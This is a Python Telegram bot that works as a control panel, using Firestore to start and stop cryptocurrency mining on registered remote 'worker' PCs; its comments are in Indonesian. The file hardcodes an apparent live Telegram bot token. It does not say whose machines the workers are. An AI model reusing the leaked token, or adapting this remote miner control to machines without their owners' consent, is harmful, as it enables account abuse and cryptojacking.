import telebot
from telebot import types
import firebase_admin
from firebase_admin import credentials, firestore
import time
import threading
import json
import os

# --- KONFIGURASI TELEGRAM ---
TOKEN = '8110550128:AAFnR9WHzplvyJquXAf rcliThCOkzxSWvnA'
MY_ID = 5828061077
bot = telebot.TeleBot(TOKEN)

# --- KONFIGURASI FIRESTORE (CLOUD) ---
firebase_config_raw = os.environ.get('__firebase_config', '{}')
firebase_config = json.loads(firebase_config_raw)
app_id = os.environ.get('__app_id', 'throne-app')

if not firebase_admin._apps:
    try:
        cred = credentials.Certificate(firebase_config)
        firebase_admin.initialize_app(cred)
    except Exception as e:
        print(f"Gagal inisialisasi Firebase: {e}")

db = firestore.client()
coll_ref = db.collection('artifacts', app_id, 'public', 'data', 'workers')

def set_command(node_id, cmd):
    """Mengirim perintah ke 1 PC spesifik"""
    try:
        doc_ref = coll_ref.document(node_id)
        doc_ref.update({
            'command': cmd,
            'timestamp': time.time()
        })
        return True
    except Exception as e:
        print(f"Error set_command: {e}")
        return False

def set_global_command(cmd):
    """Mengirim perintah ke SEMUA PC"""
    try:
        docs = coll_ref.get()
        for doc in docs:
            doc.reference.update({
                'command': cmd, 
                'timestamp': time.time()
            })
    except Exception as e:
        print(f"Error set_global_command: {e}")

@bot.message_handler(commands=['start', 'menu'])
def menu(message):
    if message.from_user.id == MY_ID:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔍 Cek & Kontrol Per PC", callback_data="status_all"))
        markup.add(types.InlineKeyboardButton("🚀 Start Semua", callback_data="all_start"),
                   types.InlineKeyboardButton("🛑 Stop Semua", callback_data="all_stop"))
        bot.reply_to(message, "👑 **Master Throne Cloud v2**\nPilih mode kontrol di bawah ini:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.from_user.id != MY_ID:
        return
        
    # --- KONTROL MASSAL ---
    if call.data == "status_all":
        docs = coll_ref.get()
        if not docs:
            bot.send_message(call.message.chat.id, "Belum ada worker yang terdaftar.")
            return

        for doc in docs:
            data = doc.to_dict()
            node_id = doc.id
            last_seen = data.get('last_seen', 0)
            status_icon = "✅" if (time.time() - last_seen) < 300 else "❌"
            mining_status = data.get('mining_status', 'Unknown')
            
            # Buat tombol khusus untuk PC ini
            row = types.InlineKeyboardMarkup()
            row.add(
                types.InlineKeyboardButton(f"🚀 Start", callback_data=f"single_start_{node_id}"),
                types.InlineKeyboardButton(f"🛑 Stop", callback_data=f"single_stop_{node_id}")
            )
            
            bot.send_message(
                call.message.chat.id, 
                f"{status_icon} **Device: {node_id}**\nStatus: {mining_status}",
                reply_markup=row,
                parse_mode="Markdown"
            )

    elif call.data == "all_start":
        set_global_command("START")
        bot.answer_callback_query(call.id, "Memulai semua miner...")
        bot.send_message(call.message.chat.id, "Sinyal START massal terkirim.")

    elif call.data == "all_stop":
        set_global_command("STOP")
        bot.answer_callback_query(call.id, "Menghentikan semua miner...")
        bot.send_message(call.message.chat.id, "Sinyal STOP massal terkirim.")

    # --- KONTROL INDIVIDUAL (SINGLE PC) ---
    elif call.data.startswith("single_"):
        parts = call.data.split("_")
        action = parts[1].upper() # START atau STOP
        node_target = parts[2]
        
        if set_command(node_target, action):
            bot.answer_callback_query(call.id, f"{action} dikirim ke {node_target}")
            bot.send_message(call.message.chat.id, f"🎯 Perintah **{action}** terkirim ke **{node_target}**", parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "Gagal mengirim perintah.")

if __name__ == "__main__":
    print("--- Master Linux Cloud v2 Started ---")
    bot.polling(none_stop=True)
